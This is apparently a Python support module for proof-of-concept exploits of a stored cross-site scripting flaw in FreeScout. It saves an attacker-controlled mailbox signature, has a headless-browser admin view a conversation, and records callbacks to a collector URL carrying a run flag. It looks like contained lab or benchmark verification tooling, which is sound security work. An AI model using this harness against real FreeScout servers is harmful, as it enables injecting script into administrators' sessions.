#!/usr/bin/env python3
"""Shared plumbing for the freescout-cve-2026-40497 PoCs.

A "probe" = store an attacker-controlled signature via the REAL FreeScout settings endpoint,
then have a REAL headless-chromium admin open the REAL conversation view. The collector records
any request the injected markup makes when the browser renders/applies it. The per-run
flag is embedded in the collector URL so a recorded hit proves THIS run's payload both
survived Helper::stripDangerousTags() and executed in the real DOM (not mere reflection).
"""
import json
import os
import urllib.parse
import urllib.request


def _flag():
    return os.environ.get("PCB_FLAG") or os.environ.get("RUN_FLAG") or "PCBFLAGUNSET"


def _cb():
    return "http://callback:9000/c?flag=" + _flag()


def _host_port(env_name, default):
    v = os.environ.get(env_name)
    if v and str(v).isdigit():
        return int(v)
    return default


def _collector():
    return "http://127.0.0.1:%d" % _host_port("PCB_CB_PORT", 33690)


def _harness():
    return "http://127.0.0.1:%d" % _host_port("PCB_VICTIM_PORT", 33670)


def _app_host_port(version):
    shared = os.environ.get("PCB_APP_PORT") or os.environ.get("PCB_TARGET_PORT")
    if shared and str(shared).isdigit():
        return int(shared)
    return {"v0": 33680, "v1": 33681, "v2": 33682}[version]


APP_INTERNAL = {"v0": "http://v0", "v1": "http://v1", "v2": "http://v2"}

# Back-compat names used by original_poc.py at import time (recomputed from env).
FLAG = _flag()
CB = _cb()


def _get(url, timeout=90):
    last = None
    for _ in range(4):
        try:
            with urllib.request.urlopen(url, timeout=timeout) as r:
                return r.read().decode("utf-8", "replace")
        except Exception as e:
            last = e
            import time
            time.sleep(2)
    raise last


def _ids(version):
    """Read the seeded mailbox/conversation ids the app wrote to public/pcb_ids.txt."""
    txt = _get("http://127.0.0.1:%d/pcb_ids.txt" % _app_host_port(version))
    q = urllib.parse.parse_qs(txt.strip())
    return q["mailbox"][0], q["conv"][0]


def run_payload(payload, version):
    """Store `payload` as the signature on `version`, render it to the victim, return collector hits."""
    _get(_collector() + "/reset")
    mailbox_id, conv_id = _ids(version)
    base = APP_INTERNAL[version]
    save = _get(_harness() + "/save?" + urllib.parse.urlencode(
        {"base": base, "mailbox": mailbox_id, "payload": payload}))
    _get(_harness() + "/visit?" + urllib.parse.urlencode({"base": base, "conv": conv_id}))
    dump = json.loads(_get(_collector() + "/dump"))
    return {"hits": dump, "save": save}
